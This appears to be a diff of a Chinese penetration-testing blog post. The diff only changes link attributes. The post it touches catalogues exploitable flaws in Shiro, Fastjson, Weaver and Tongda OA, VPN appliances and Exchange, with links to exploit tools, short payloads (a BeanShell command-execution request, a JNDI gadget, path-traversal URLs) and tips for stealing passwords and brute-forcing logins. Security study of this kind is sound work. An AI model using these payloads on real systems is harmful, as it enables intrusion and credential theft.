@@ -129,7 +129,7 @@
 <p><strong>5. 漏洞分析</strong></p>
 <p>【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞<br><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/" target="_blank" rel="noopener">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具<br><a href="https://github.com/wyzxxz/shiro_rce">https://github.com/wyzxxz/shiro_rce</a></p>
+<p>wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具<br><a href="https://github.com/wyzxxz/shiro_rce" target="_blank" rel="noopener">https://github.com/wyzxxz/shiro_rce</a></p>
 <p>Apache Shiro回显poc改造计划<br><a href="https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.使用多个泄露的key进行遍历, 这个在实战中确实有效</p>
@@ -167,7 +167,7 @@
 <p>Shiro 721 Padding Oracle攻击漏洞分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/193165" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193165</a></p>
 <p>Apache Shiro 远程代码执行漏洞复现 – OnionT’s Blog<br><a href="http://www.oniont.cn/index.php/archives/298.html" target="_blank" rel="noopener">http://www.oniont.cn/index.php/archives/298.html</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>wuppp/shiro_rce_exp: Shiro RCE (Padding Oracle Attack)<br><a href="https://github.com/wuppp/shiro_rce_exp">https://github.com/wuppp/shiro_rce_exp</a></p>
+<p>wuppp/shiro_rce_exp: Shiro RCE (Padding Oracle Attack)<br><a href="https://github.com/wuppp/shiro_rce_exp" target="_blank" rel="noopener">https://github.com/wuppp/shiro_rce_exp</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.该漏洞需要登录后获取到合法的<code>Cookie: rememberMe=XXX</code>后才可以进行利用, 看起来不是很好利用</p>
 <p>但实际上有一些网站是开放注册的, 而且这个洞不需要知道服务端密钥</p>
@@ -216,7 +216,7 @@
 <p>Fastjson &lt;=1.2.47 远程代码执行漏洞分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/181874" target="_blank" rel="noopener">https://www.anquanke.com/post/id/181874</a></p>
 <p><strong>6. 漏洞利用</strong></p>
 <p>1.JDK降级编译</p>
-<p>CaijiOrz/fastjson-1.2.47-RCE: Fastjson &lt;= 1.2.47 远程命令执行漏洞利用工具及方法<br><a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
+<p>CaijiOrz/fastjson-1.2.47-RCE: Fastjson &lt;= 1.2.47 远程命令执行漏洞利用工具及方法<br><a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
 <p>源项目中最后一句</p>
 <blockquote>
 <p>当javac版本和目标服务器差太多, 会报一个这样得到错误, 所以需要使用1.8的javac来编译Exploit.java</p>
@@ -241,7 +241,7 @@
 
 <p>当服务器连接过来时, <code>User-Agent</code>中会标明当前服务器的JDK版本</p>
 <p>2.当发现一台Redis的数据中有@type字样时, 意味着autotype大概率是开的, 只要不存在黑名单中的利用链都可以用#[同理可以用在jackson上]</p>
-<p>fastjson/GenericFastJsonRedisSerializer.java at master · alibaba/fastjson<br><a href="https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java">https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java</a></p>
+<p>fastjson/GenericFastJsonRedisSerializer.java at master · alibaba/fastjson<br><a href="https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java</a></p>
 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public class GenericFastJsonRedisSerializer implements RedisSerializer&lt;Object&gt; {</span><br><span class="line">private final static ParserConfig defaultRedisConfig = new ParserConfig();</span><br><span class="line">static { defaultRedisConfig.setAutoTypeSupport(true);}</span><br></pre></td></tr></tbody></table></figure>
 
 <p>其他消息队列之类的都是同理</p>
@@ -259,7 +259,7 @@
 <p>跟Fastjson漏洞原理都是一样的, 每次修复基本都是更新黑名单, 漏洞分析可以参考</p>
 <p>Jackson-databind-2670远程代码执行漏洞简单分析 – 先知社区<br><a href="https://xz.aliyun.com/t/7506" target="_blank" rel="noopener">https://xz.aliyun.com/t/7506</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>learnjavabug/jackson/src/main/java/com/threedr3am/bug/jackson at master · threedr3am/learnjavabug<br><a href="https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson">https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson</a></p>
+<p>learnjavabug/jackson/src/main/java/com/threedr3am/bug/jackson at master · threedr3am/learnjavabug<br><a href="https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson</a></p>
 <p>POC</p>
 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">["ch.qos.logback.core.db.JNDIConnectionSource", {"jndiLocation":"ldap://localhost:43658/Calc"}]</span><br></pre></td></tr></tbody></table></figure>
 
@@ -287,7 +287,7 @@
 <p>Maven Repository: com.thoughtworks.xstream » xstream » 1.4.10 (Usages)<br><a href="https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages" target="_blank" rel="noopener">https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages</a></p>
 <p>2.xml 不仅可以xxe, 还能反序列化代码执行</p>
 <p>2.xxe 漏洞用 <code>xxer</code>, 方便快捷</p>
-<p>TheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab.<br><a href="https://github.com/TheTwitchy/xxer">https://github.com/TheTwitchy/xxer</a></p>
+<p>TheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab.<br><a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a></p>
 <p><strong>8. 防护方法</strong></p>
 <p>1.升级到最新版</p>
 <h2 id="泛微OA-Bsh-远程代码执行漏洞"><a href="#泛微OA-Bsh-远程代码执行漏洞" class="headerlink" title="泛微OA Bsh 远程代码执行漏洞"></a>泛微OA Bsh 远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p>
@@ -301,10 +301,10 @@
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>泛微OA E-cology远程代码执行漏洞原理分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/215218.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/215218.html</a></p>
-<p><a href="https://github.com/beanshell/beanshell">https://github.com/beanshell/beanshell</a></p>
+<p><a href="https://github.com/beanshell/beanshell" target="_blank" rel="noopener">https://github.com/beanshell/beanshell</a></p>
 <p><a href="http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI" target="_blank" rel="noopener">http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>Vulnerability-analysis/0917/weaver-oa/CNVD-2019-32204 at master · myzing00/Vulnerability-analysis<br><a href="https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204">https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204</a></p>
+<p>Vulnerability-analysis/0917/weaver-oa/CNVD-2019-32204 at master · myzing00/Vulnerability-analysis<br><a href="https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204" target="_blank" rel="noopener">https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204</a></p>
 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /weaver/bsh.servlet.BshServlet HTTP/1.1</span><br><span class="line">Host: xxxxxxxx:8088</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 98</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw</span><br></pre></td></tr></tbody></table></figure>
 
 <p><strong>7. 利用技巧</strong></p>
@@ -331,7 +331,7 @@
 <p>泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库) – 先知社区<br><a href="https://xz.aliyun.com/t/6531" target="_blank" rel="noopener">https://xz.aliyun.com/t/6531</a></p>
 <p><strong>6. 漏洞利用</strong></p>
 <p>泛微OA e-cology WorkflowCenterTreeData前台接口SQL注入漏洞复现<em>数据库</em>小龙人-CSDN博客<br><a href="https://blog.csdn.net/zycdn/article/details/102494037" target="_blank" rel="noopener">https://blog.csdn.net/zycdn/article/details/102494037</a></p>
-<p>Tentacle/ecology8_mobile_sql_inject.py at 6e1cecd52b10526c4851a26249339367101b3ca2 · orleven/Tentacle<br><a href="https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py">https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py</a></p>
+<p>Tentacle/ecology8_mobile_sql_inject.py at 6e1cecd52b10526c4851a26249339367101b3ca2 · orleven/Tentacle<br><a href="https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py" target="_blank" rel="noopener">https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py</a></p>
 <p>应用安全 – 软件漏洞 – 泛微OA漏洞汇总 – AdreamWillB – 博客园<br><a href="https://www.cnblogs.com/AtesetEnginner/p/11558469.html" target="_blank" rel="noopener">https://www.cnblogs.com/AtesetEnginner/p/11558469.html</a></p>
 <p><code>/mobile/plugin/SyncUserInfo.jsp</code> 这个也是有问题的, 但由于没有公开的分析报告, 漏洞相对简单, 这里不过多描述</p>
 <p><strong>7. 利用技巧</strong></p>
@@ -363,9 +363,9 @@
 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="泛微-协同办公OA"</span><br></pre></td></tr></tbody></table></figure>
 
 <p><strong>5. 漏洞分析</strong></p>
-<p>jas502n/DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞<br><a href="https://github.com/jas502n/DBconfigReader">https://github.com/jas502n/DBconfigReader</a></p>
+<p>jas502n/DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞<br><a href="https://github.com/jas502n/DBconfigReader" target="_blank" rel="noopener">https://github.com/jas502n/DBconfigReader</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>linbing/Weaver_Ecology_Oa_Config.py at master · taomujian/linbing<br>[<a href="https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py]">https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py]</a>(<a href="https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver">https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver</a> Ecology OA/Weaver_Ecology_Oa_Config.py)</p>
+<p>linbing/Weaver_Ecology_Oa_Config.py at master · taomujian/linbing<br>[<a href="https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py]" target="_blank" rel="noopener">https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py]</a>(<a href="https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver" target="_blank" rel="noopener">https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver</a> Ecology OA/Weaver_Ecology_Oa_Config.py)</p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.虽然是接口返回数据是加密的, 但是因为硬编码密钥的缘故, 解密也很简单, pydes就可以解密, 只是这里pydes本身有个bug, 修复方式 <code>pyDes.des(' ')</code><br>2.这里解密出来的密码一般都是泛微默认的, 且数据库监听在127.0.0.1上, 用处看个人发挥了<br>3.此外泛微还有一些漏洞, 但是基本最新版都修复了, 由于没公开过, 就让他消失吧</p>
 <p><strong>8. 防护方法</strong></p>
@@ -382,12 +382,12 @@
 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="通达OA"</span><br></pre></td></tr></tbody></table></figure>
 
 <p><strong>5. 漏洞分析</strong></p>
-<p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313通达OA/readme.md">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p>
+<p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313通达OA/readme.md" target="_blank" rel="noopener">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p>
 <p>代码审计 | 通达OA 任意用户登录漏洞（匿名RCE）分析 | zrools<br><a href="https://www.zrools.org/2020/04/23/代码审计-通达OA-任意用户登录漏洞（匿名RCE）分析/" target="_blank" rel="noopener">https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313通达OA/readme.md">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p>
-<p>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞<br><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p>
-<p>tools/tongda_v11.4_rce_exp.py at master · zrools/tools 管理员伪造后sql写shell<br><a href="https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py">https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py</a></p>
+<p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313通达OA/readme.md" target="_blank" rel="noopener">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p>
+<p>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞<br><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p>
+<p>tools/tongda_v11.4_rce_exp.py at master · zrools/tools 管理员伪造后sql写shell<br><a href="https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py" target="_blank" rel="noopener">https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.这个漏洞也很简单, 发预警的当天就分析出来了, 一个上传, 一个包含, 主要是文件包含漏洞的/ispirit/interface/gateway.php文件在v11才有</p>
 <p>绕过disable_function也很简单, 直接调用<code>COM('WScript.shell')</code>组件就ok了</p>
@@ -401,7 +401,7 @@
 <p>3.2020年4月20号爆出任意用户伪造登录, 这里小伙伴测试 2017 和 v11 的 poc 好像可以用同一个</p>
 <p>(我们看标题挖漏洞, 全网第一时间推送了带复现截图的漏洞通告, 也引发了大家不少讨论)</p>
 <p>通达OA前台任意用户伪造登录漏洞<br><a href="https://vas.riskivy.com/vuln-detail?id=33" target="_blank" rel="noopener">https://vas.riskivy.com/vuln-detail?id=33</a></p>
-<p>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞<br><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p>
+<p>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞<br><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p>
 <p><strong>8. 防护方法</strong></p>
 <p>1.及时更新补丁</p>
 <p>2.使用waf拦截</p>
@@ -417,7 +417,7 @@
 <p><strong>5. 漏洞分析</strong></p>
 <p>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog<br><a href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/" target="_blank" rel="noopener">http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>timwhitez/seeyon-OA-A8-GetShell: 致远OA A8 某些版本批量getshell漏洞/seeyon OA A8 some version getshell from url list<br><a href="https://github.com/timwhitez/seeyon-OA-A8-GetShell">https://github.com/timwhitez/seeyon-OA-A8-GetShell</a></p>
+<p>timwhitez/seeyon-OA-A8-GetShell: 致远OA A8 某些版本批量getshell漏洞/seeyon OA A8 some version getshell from url list<br><a href="https://github.com/timwhitez/seeyon-OA-A8-GetShell" target="_blank" rel="noopener">https://github.com/timwhitez/seeyon-OA-A8-GetShell</a></p>
 <p>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog<br><a href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/" target="_blank" rel="noopener">http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></p>
 <p>这里还有个XXE</p>
 <p>致远OA帆软报表组件前台XXE漏洞(0day)挖掘过程 LandGrey’s Blog<br><a href="https://landgrey.me/blog/8/" target="_blank" rel="noopener">https://landgrey.me/blog/8/</a></p>
@@ -444,7 +444,7 @@
 <p>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog<br><a href="http://foreversong.cn/archives/1378" target="_blank" rel="noopener">http://foreversong.cn/archives/1378</a></p>
 <p><strong>6. 漏洞利用</strong></p>
 <p>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog<br><a href="http://foreversong.cn/archives/1378" target="_blank" rel="noopener">http://foreversong.cn/archives/1378</a></p>
-<p>xray/finereport-directory-traversal.yml at master · chaitin/xray<br><a href="https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml">https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml</a><br><strong>7. 利用技巧</strong></p>
+<p>xray/finereport-directory-traversal.yml at master · chaitin/xray<br><a href="https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml" target="_blank" rel="noopener">https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml</a><br><strong>7. 利用技巧</strong></p>
 <p>1.未设置密码或者读取读取管理员密码<br><a href="https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892" target="_blank" rel="noopener">https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892</a></p>
 <p>这里很有可能是没有设置密码的, 修改密码进入后台就可以了</p>
 <p>如果设置里密码, 尝试这个接口 <code>/report/ReportServer?op=chart&amp;cmd=get_geo_json&amp;resourcepath=privilege.xml</code>, 读取管理员密码, 然后使用上文的解密程序解密</p>
@@ -560,9 +560,9 @@
 <p>Orange: Attacking SSL VPN – Part 2: Breaking the Fortigate SSL VPN<br><a href="https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1" target="_blank" rel="noopener">https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1</a></p>
 <p><strong>6. 漏洞利用</strong></p>
 <p>密码读取</p>
-<p>milo2012/CVE-2018-13379: CVE-2018-13379<br><a href="https://github.com/milo2012/CVE-2018-13379">https://github.com/milo2012/CVE-2018-13379</a></p>
+<p>milo2012/CVE-2018-13379: CVE-2018-13379<br><a href="https://github.com/milo2012/CVE-2018-13379" target="_blank" rel="noopener">https://github.com/milo2012/CVE-2018-13379</a></p>
 <p>任意密码重置, 这肯定是个后门</p>
-<p>milo2012/CVE-2018-13382: CVE-2018-13382<br><a href="https://github.com/milo2012/CVE-2018-13382">https://github.com/milo2012/CVE-2018-13382</a></p>
+<p>milo2012/CVE-2018-13382: CVE-2018-13382<br><a href="https://github.com/milo2012/CVE-2018-13382" target="_blank" rel="noopener">https://github.com/milo2012/CVE-2018-13382</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.文件读取的路径构造</p>
 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxxxxx:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession</span><br></pre></td></tr></tbody></table></figure>
@@ -593,8 +593,8 @@
 <p><strong>5. 漏洞分析</strong></p>
 <p>Pulse Secure SSL VPN远程代码执行漏洞利用与分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/185773" target="_blank" rel="noopener">https://www.anquanke.com/post/id/185773</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>projectzeroindia/CVE-2019-11510: Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510)<br><a href="https://github.com/projectzeroindia/CVE-2019-11510">https://github.com/projectzeroindia/CVE-2019-11510</a></p>
-<p>0xDezzy/CVE-2019-11539: Exploit for the Post-Auth RCE vulnerability in Pulse Secure Connect<br><a href="https://github.com/0xDezzy/CVE-2019-11539">https://github.com/0xDezzy/CVE-2019-11539</a></p>
+<p>projectzeroindia/CVE-2019-11510: Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510)<br><a href="https://github.com/projectzeroindia/CVE-2019-11510" target="_blank" rel="noopener">https://github.com/projectzeroindia/CVE-2019-11510</a></p>
+<p>0xDezzy/CVE-2019-11539: Exploit for the Post-Auth RCE vulnerability in Pulse Secure Connect<br><a href="https://github.com/0xDezzy/CVE-2019-11539" target="_blank" rel="noopener">https://github.com/0xDezzy/CVE-2019-11539</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p><strong>8. 防护方法</strong></p>
 <p>1.及时更新补丁</p>
@@ -612,7 +612,7 @@
 <p>Orange: Attacking SSL VPN – Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!<br><a href="https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html" target="_blank" rel="noopener">https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html</a></p>
 <p>Palo Alto GlobalProtect上的PreAuth RCE – 渗透测试中心 – 博客园<br><a href="https://www.cnblogs.com/backlion/p/11209054.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/11209054.html</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>securifera/CVE-2019-1579<br><a href="https://github.com/securifera/CVE-2019-1579">https://github.com/securifera/CVE-2019-1579</a></p>
+<p>securifera/CVE-2019-1579<br><a href="https://github.com/securifera/CVE-2019-1579" target="_blank" rel="noopener">https://github.com/securifera/CVE-2019-1579</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.这个扫描的话可以判断</p>
 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/global-protect/portal/css/login.css`</span><br><span class="line">`/images/logo_pan_158.gif</span><br></pre></td></tr></tbody></table></figure>
@@ -636,7 +636,7 @@
 <p><strong>5. 漏洞分析</strong></p>
 <p>Citrix Gateway/ADC 远程代码执行漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/news/232752.html" target="_blank" rel="noopener">https://www.freebuf.com/news/232752.html</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>trustedsec/cve-2019-19781: This is a tool published for the Citrix ADC (NetScaler) vulnerability. We are only disclosing this due to others publishing the exploit code first.<br><a href="https://github.com/trustedsec/cve-2019-19781">https://github.com/trustedsec/cve-2019-19781</a></p>
+<p>trustedsec/cve-2019-19781: This is a tool published for the Citrix ADC (NetScaler) vulnerability. We are only disclosing this due to others publishing the exploit code first.<br><a href="https://github.com/trustedsec/cve-2019-19781" target="_blank" rel="noopener">https://github.com/trustedsec/cve-2019-19781</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.通过以下命令可以快速断定</p>
 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://host/vpn/../vpns/cfg/smb.conf --path-as-is --insecure</span><br></pre></td></tr></tbody></table></figure>
@@ -682,9 +682,9 @@
 <p>Microsoft Exchange 任意用户伪造漏洞（CVE-2018-8581）分析<br><a href="https://paper.seebug.org/804/" target="_blank" rel="noopener">https://paper.seebug.org/804/</a></p>
 <p>微软Exchange服务器远程代码执行漏洞复现分析[CVE-2020-0688] – 先知社区<br><a href="https://xz.aliyun.com/t/7299" target="_blank" rel="noopener">https://xz.aliyun.com/t/7299</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>Ridter/Exchange2domain: CVE-2018-8581<br><a href="https://github.com/Ridter/Exchange2domain">https://github.com/Ridter/Exchange2domain</a></p>
-<p>Ridter/cve-2020-0688: cve-2020-0688<br><a href="https://github.com/Ridter/cve-2020-0688">https://github.com/Ridter/cve-2020-0688</a></p>
-<p>pwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formatters<br><a href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a></p>
+<p>Ridter/Exchange2domain: CVE-2018-8581<br><a href="https://github.com/Ridter/Exchange2domain" target="_blank" rel="noopener">https://github.com/Ridter/Exchange2domain</a></p>
+<p>Ridter/cve-2020-0688: cve-2020-0688<br><a href="https://github.com/Ridter/cve-2020-0688" target="_blank" rel="noopener">https://github.com/Ridter/cve-2020-0688</a></p>
+<p>pwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formatters<br><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">https://github.com/pwntester/ysoserial.net</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.寻找企业的Exchange有个技巧</p>
 <p>除了访问以下域名或者直接查找 <code>DNS MX</code> 记录</p>
@@ -701,7 +701,7 @@
 <p><code>/ews</code> 这里是ews的接口, 可以进行401认证爆破, 只需要(域)账号和密码, 不需要知道域名前缀, 更方便爆破</p>
 <p><code>/autodiscover/autodiscover.xml</code> 自动发现接口, 同ews爆破</p>
 <p>3.爆破工具可使用 <code>owa</code>用<code>burp</code>, <code>ews</code>用<code>ruler</code>, <code>awvs</code>(比较好用)</p>
-<p>sensepost/ruler: A tool to abuse Exchange services<br><a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></p>
+<p>sensepost/ruler: A tool to abuse Exchange services<br><a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">https://github.com/sensepost/ruler</a></p>
 <p>4.弱口令爆破技巧, 爆破<code>Exchange</code>相对比较好用, 直接生成企业特色弱口令</p>
